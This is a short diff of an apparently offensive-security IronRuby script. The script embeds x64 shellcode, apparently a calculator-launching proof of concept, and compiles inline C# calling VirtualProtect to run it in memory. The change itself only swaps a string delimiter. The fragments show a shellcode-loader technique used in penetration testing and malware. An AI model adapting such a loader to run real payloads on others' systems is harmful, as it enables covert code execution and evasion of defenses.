@@ -22,7 +22,7 @@ shellcode = System::Array[System::Byte].new [ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0
     0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00]
 
 
-code = %{ 
+code = %@ 
     using System;
     using System.Collections.Generic;
     using System.Text;
@@ -84,7 +84,7 @@ code = %{
             int dwSize, uint flNewProtect, out uint lpflOldProtect);
         }
     }
- }
+ @
 
  def generate(code)
     CompilerParams = Compiler::CompilerParameters.new()
